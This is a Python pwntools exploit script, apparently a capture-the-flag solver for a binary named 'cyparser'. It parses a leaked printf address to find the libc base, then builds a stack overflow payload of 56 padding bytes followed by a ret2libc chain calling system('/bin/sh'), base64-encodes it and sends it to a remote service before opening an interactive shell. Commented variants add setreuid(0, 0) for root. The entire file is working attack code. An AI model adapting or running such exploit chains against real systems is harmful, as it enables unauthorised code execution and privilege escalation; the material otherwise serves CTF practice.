#!/usr/bin/env python3

from pwn import *
from base64 import b64encode as be
exe = ELF("./cyparser")

context.binary = exe


def conn(payload1, payload2=None):
    if args.LOCAL:
        r = process([exe.path, payload1, payload2] if payload2 else [exe.path, payload1])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

# payload = "CY\0"+("A"* (335 - 100) )
prefix = "CY\0"

# print(payload)
#     b *main + 596
def main():
    r = conn("1")
    leak = r.recvline().strip()
    printf_leak = int(leak.decode().split("using ")[1].split(" ")[0], 16)
    print(f"printf leak: {printf_leak} => {hex(printf_leak)}")
    libc = ELF("./libc.so.6")
    
    libc.address = printf_leak - libc.symbols["printf"]
    libc_ROP = ROP(libc)
    print(f"libc base: {libc.address} => {hex(libc.address)}")
    bin_sh = next(libc.search(b"/bin/sh"))
    print(f"/bin/sh: {bin_sh} => {hex(bin_sh)}")

    payload = flat(
    prefix,
    "A" * (56),
    libc_ROP.chain(),
    "\0" * 11
    )
    payload = flat(
    prefix,
    "A" * (56),
    p64(ROP(libc).find_gadget(["pop rdi"])[0]), # pop rdi; ret gadget
    p64(bin_sh), # "/bin/sh" address
    p64(ROP(exe).find_gadget(["ret"])[0]), # ret to align stack
    p64(libc.symbols["system"]), # system address
    "\0" * 13 # padding to make the payload % 4 = 0
    )

    # this can work too got it from Sam4uai's solver.
    # libc_ROP.setreuid(0, 0)
    # libc_ROP.system(bin_sh)
    # payload = flat(
    # prefix,
    # "A" * (56),
    # libc_ROP.chain(),
    # "\0" * 11
    # ) 
    payload = be(payload).decode().replace("=", "")
    # gdb.attach(r, """
    # b * main + 703
    # c
    # """)
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
